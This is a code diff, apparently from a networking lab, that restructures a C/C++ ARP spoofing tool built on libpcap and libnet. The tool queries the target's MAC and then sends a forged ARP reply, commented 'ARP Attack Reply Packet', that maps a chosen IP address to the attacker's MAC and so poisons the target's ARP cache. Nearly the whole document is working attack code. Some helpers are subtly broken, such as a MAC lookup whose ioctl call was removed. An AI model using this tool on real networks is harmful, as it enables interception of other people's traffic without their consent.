@@ -1,46 +1,127 @@
-#include <stdio.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
 #include <cstdint>
 #include <string.h>
 #include <pcap.h>
-#include <stab.h>
-#include <libnet/libnet-macros.h>
-#include <libnet/libnet-structures.h>
-#include <libnet/libnet-types.h>
-#include <libnet/libnet-headers.h>
-
 #include <iostream>
-#include <stdio.h>
 #include <sys/socket.h>
-#include <arpa/inet.h>
 #include <netinet/in.h>
-#include <errno.h>
-#include <string.h>
-#include <stdlib.h>
 #include <sys/ioctl.h>
-#include <fcntl.h>
 #include <net/if.h>
 #include <unistd.h>
 #include <sstream>
-#include <vector>
 #include <sys/types.h>
 #include <ifaddrs.h>
-#include <typeinfo>
-
+#include <libnet/libnet-macros.h>
+#include <libnet/libnet-types.h>
+#include <libnet/libnet-headers.h>
+#include <structure.cpp>
+#include "define.h"
 #define PCAP_OPENFLAG_PROMISCUOUS   1
+
 using namespace std;
 
+int main(int argc, char **argv)
+{
+    pcap_t *fp;
+    u_char packet[42];
+    libnet_ethernet_hdr eth_header = {};
+    libnet_arp_hdr arp_header = {};
+    arp_format arp_info = {};
 
-#pragma pack(1)
-struct arp_format {
-    uint8_t send_mac[6];
-    in_addr_t send_ip;
-    uint8_t target_mac[6];
-    in_addr_t target_ip;
-};
-#pragma pack(8)
+    char *interface = argv[1];
+    char errbuf[PCAP_ERRBUF_SIZE];
+    char *target_ip = argv[2];
+    char *sender_ip = argv[3];
+    char *my_ip = getIpAddress(interface);
 
+    uint8_t mac[6]={0};
+    uint8_t broad_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
+    uint16_t arp_type = 0x0608;
+    getMacAddress(interface,mac);
+
+
+    interface = pcap_lookupdev(errbuf);
+    if ( (fp = pcap_open_live(interface, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf)) == NULL)
+    {
+        fprintf(stderr,"Unable to open the Adapter.%s is not supported by Libpcap %s", interface, errbuf);
+        return 0;
+    }
+
+    setEther(&eth_header, broad_mac, mac);
+    setArpType(&arp_header, 0x0100);
+    setArpInfo(&arp_info, broad_mac, target_ip, mac, my_ip);
+
+    //Copy Header to memory
+    memcpy(packet, &eth_header, sizeof(eth_header));
+    memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
+    memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));
+    //copyPacket(&packet, &eth_header, &arp_header, &arp_info);
+
+
+    //printHex(sizeof(packet),packet);
+
+    //Send Packet
+    if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
+    {
+        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
+        return 0;
+    }
+
+    //Listen ARP Reply
+     while (true) {
+        struct pcap_pkthdr* header;
+        const libnet_ethernet_hdr* ethdr;
+        const u_char* read_packet;
+        const libnet_arp_hdr * recv_arp_info;
+        const arp_format * recv_arp_data;
+        int res = pcap_next_ex(fp, &header, &read_packet);
+
+        //Get Ethernet Header From Packet
+        ethdr = (struct libnet_ethernet_hdr*)(read_packet);
+
+        //arp check
+        if (ethdr->ether_type == arp_type)
+        {
+            //Get IP Header From Packet
+            recv_arp_info = (struct libnet_arp_hdr*)(read_packet+sizeof(struct libnet_ethernet_hdr));
+            recv_arp_data = (struct arp_format*)(read_packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr));
+
+            uint8_t send_mac[6] = {0};
+            memcpy(send_mac, recv_arp_data->send_mac, sizeof(recv_arp_data->send_mac));
+
+            //Set Send Packet
+            setEther(&eth_header, send_mac, mac);
+            setArpType(&arp_header, 0x0200);
+            setArpInfo(&arp_info, send_mac, target_ip, mac, sender_ip);
+
+            //Copy Header to memory
+            memcpy(packet, &eth_header, sizeof(eth_header));
+            memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
+            memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));
+
+            //Send ARP Attack Reply Packet
+            printHex(sizeof(packet),packet);
+            if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
+            {
+                fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
+                return 0;
+            }
+            break;
+        }
+     }
+
+    pcap_close(fp);
+
+    return 0;
+}
+
+/**
+ * @brief getIpAddress
+ * @details Get My Network Interface's IP
+ * @param interface
+ * @return
+ */
 char* getIpAddress(char *interface)
 {
     struct ifaddrs *ifap, *ifa;
@@ -63,30 +144,29 @@ char* getIpAddress(char *interface)
 
     freeifaddrs(ifap);
 
-
 }
 
+
+/**
+ * @brief getMacAddress
+ * @detail Get My Network Interface's MAC Address
+ * @param interface
+ * @param mac
+ */
 void getMacAddress(char *interface, uint8_t *mac)
 {
         int fd;
 
        struct ifreq ifr;
-       //char *iface = "enp0s3";
        fd = socket(AF_INET, SOCK_DGRAM, 0);
 
        ifr.ifr_addr.sa_family = AF_INET;
        strncpy((char *)ifr.ifr_name , (const char *)interface , IFNAMSIZ-1);
 
-       //ioctl(fd, SIOCGIFHWADDR, &ifr);
 
        close(fd);
 
-       //uint8_t mac2[6] = {0};
-       //mac = (u_char*)ifr.ifr_hwaddr.sa_data;
        memcpy(mac, (uint8_t*)ifr.ifr_hwaddr.sa_data, 6);
-
-       //sprintf((char *)uc_Mac,(const char *)"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-
 }
 /**
  * @brief printHex
@@ -94,7 +174,8 @@ void getMacAddress(char *interface, uint8_t *mac)
  * @param length
  * @param packet
  */
-void printHex(int length, const u_char* packet ) {
+void printHex(int length, const u_char* packet )
+{
 
     int i=0;
     while(i<length) {
@@ -113,6 +194,15 @@ void printHex(int length, const u_char* packet ) {
 
     printf("\n");
 }
+/**
+ * @brief setArpInfo
+ * @detail Set ARP  Sender and Target Info
+ * @param ptr
+ * @param target_mac
+ * @param target_ip
+ * @param sender_mac
+ * @param sender_ip
+ */
 void setArpInfo(struct arp_format *ptr,  uint8_t target_mac[6], char *target_ip, uint8_t sender_mac[6], char *sender_ip)
 {
 
@@ -122,15 +212,12 @@ void setArpInfo(struct arp_format *ptr,  uint8_t target_mac[6], char *target_ip,
     ptr->target_ip = inet_addr(target_ip);
 }
 
-
 /**
- * @brief main
- * @param argc
- * @param argv
- * @return
+ * @brief setArpType
+ * @detail Set ARP Header Info
+ * @param ptr
+ * @param opcode
  */
-
-//void setArpType(struct libnet_arp_hdr *ptr, uint8_t target_mac[6], char *target_ip, uint8_t sender_mac[6], char *sender_ip, u_int16_t opcode)
 void setArpType(struct libnet_arp_hdr *ptr, u_int16_t opcode)
 {
     //Set ARP Header
@@ -140,12 +227,12 @@ void setArpType(struct libnet_arp_hdr *ptr, u_int16_t opcode)
     ptr->ar_pln = 0x04;
     ptr->ar_op = opcode;
 }
-
 /**
- * @brief main
- * @param argc
- * @param argv
- * @return
+ * @brief setEther
+ * @detail Set Ethernet Header
+ * @param ptr
+ * @param target_mac
+ * @param sender_mac
  */
 void setEther(struct libnet_ethernet_hdr *ptr, uint8_t target_mac[6], uint8_t sender_mac[6])
 {
@@ -156,98 +243,19 @@ void setEther(struct libnet_ethernet_hdr *ptr, uint8_t target_mac[6], uint8_t se
     ptr->ether_type = 0x0608;
 
 }
-int main(int argc, char **argv) {
-    pcap_t *fp;
-    u_char packet[42];
-    libnet_ethernet_hdr eth_header = {};
-    libnet_arp_hdr arp_header = {};
-    arp_format arp_info = {};
 
-    char *interface = argv[1];
-    char errbuf[PCAP_ERRBUF_SIZE];
-    char *target_ip = argv[2];
-    char *sender_ip = argv[3];
-    char *my_ip = getIpAddress(interface);
-
-    uint8_t mac[6]={0};
-    uint8_t broad_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
-    uint16_t arp_type = 0x0608;
-
-    getMacAddress(interface,mac);
-
-
-
-    interface = pcap_lookupdev(errbuf);
-
-    if ( (fp = pcap_open_live(interface, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf)) == NULL)
-    {
-        fprintf(stderr,"Unable to open the Adapter.%s is not supported by Libpcap %s", interface, errbuf);
-        return 0;
-    }
-
-    setEther(&eth_header, broad_mac, mac);
-    setArpType(&arp_header, 0x0100);
-    setArpInfo(&arp_info, broad_mac, target_ip, mac, my_ip);
-
-
+/**
+ * @brief copyPacket
+ * @param packet
+ * @param eth_header
+ * @param arp_header
+ * @param arp_info
+ */
+void copyPacket(u_char *packet, libnet_ethernet_hdr *eth_header, libnet_arp_hdr *arp_header, arp_format *arp_info)
+{
     //Copy Header to memory
-    memcpy(packet, &eth_header, sizeof(eth_header));
-    memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
-    memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));
+    memcpy(&packet, &eth_header, sizeof(eth_header));
+    memcpy(&packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
+    memcpy(&packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));
 
-    //Send Packet
-
-    printHex(sizeof(packet),packet);
-    if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
-    {
-        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
-        return 0;
-    }
-     while (true) {
-        struct pcap_pkthdr* header;
-        const libnet_ethernet_hdr* ethdr;
-        const u_char* read_packet;
-        const libnet_arp_hdr * recv_arp_info;
-        const arp_format * recv_arp_data;
-        int res = pcap_next_ex(fp, &header, &read_packet);
-
-        //Get Ethernet Header From Packet
-        ethdr = (struct libnet_ethernet_hdr*)(read_packet);
-
-        //arp check
-        if (ethdr->ether_type == arp_type)
-        {
-            //Get IP Header From Packet
-            recv_arp_info = (struct libnet_arp_hdr*)(read_packet+sizeof(struct libnet_ethernet_hdr));
-            recv_arp_data = (struct arp_format*)(read_packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr));
-
-            uint8_t send_mac[6] = {0};
-            memcpy(send_mac, recv_arp_data->send_mac, sizeof(recv_arp_data->send_mac));
-
-            setEther(&eth_header, send_mac, mac);
-            setArpType(&arp_header, 0x0200);
-
-            setArpInfo(&arp_info, send_mac, target_ip, mac, sender_ip);
-
-
-            //Copy Header to memory
-            memcpy(packet, &eth_header, sizeof(eth_header));
-            memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
-            memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));
-
-            //Send Packet
-            printHex(sizeof(packet),packet);
-            if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
-            {
-                fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
-                return 0;
-            }
-            break;
-        }
-     }
-
-
-    pcap_close(fp);
-
-    return 0;
 }
